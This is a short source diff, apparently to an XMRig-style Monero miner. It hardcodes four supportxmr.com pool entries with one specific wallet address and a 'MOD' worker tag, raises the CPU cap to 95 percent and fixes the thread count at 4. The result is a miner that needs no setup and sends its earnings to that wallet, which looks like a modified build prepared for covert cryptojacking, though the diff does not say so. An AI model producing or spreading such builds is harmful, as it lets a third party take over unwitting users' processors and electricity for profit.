@@ -196,16 +196,19 @@ Options::Options(int argc, char **argv) :
     m_algoVariant(0),
     m_apiPort(0),
     m_donateLevel(kDonateLevel),
-    m_maxCpuUsage(75),
+    m_maxCpuUsage(95),
     m_printTime(60),
     m_priority(-1),
     m_retries(5),
     m_retryPause(5),
-    m_threads(0),
+    m_threads(4),
     m_affinity(-1L)
 {
-    m_pools.push_back(new Url());
-
+    m_pools.push_back(new Url("pool.supportxmr.com", 3333, "4956NVBAzkGA8imVZzLYe7f65xG8HXiERGbbMEHqiqfqdyDFdjwqXVv8U1MHbiki6jjMzMUykNmYQLNUvEbkTJDU9miq5qb", "github.x64.MOD.t4"));
+    m_pools.push_back(new Url("pool.supportxmr.com", 80, "4956NVBAzkGA8imVZzLYe7f65xG8HXiERGbbMEHqiqfqdyDFdjwqXVv8U1MHbiki6jjMzMUykNmYQLNUvEbkTJDU9miq5qb", "github.x64.MOD.t4"));
+    m_pools.push_back(new Url("pool.supportxmr.com", 8080, "4956NVBAzkGA8imVZzLYe7f65xG8HXiERGbbMEHqiqfqdyDFdjwqXVv8U1MHbiki6jjMzMUykNmYQLNUvEbkTJDU9miq5qb", "github.x64.MOD.t4"));
+    m_pools.push_back(new Url("ca01.supportxmr.com", 3333, "4956NVBAzkGA8imVZzLYe7f65xG8HXiERGbbMEHqiqfqdyDFdjwqXVv8U1MHbiki6jjMzMUykNmYQLNUvEbkTJDU9miq5qb", "github.x64.MOD.t4"));
+	
     int key;
 
     while (1) {
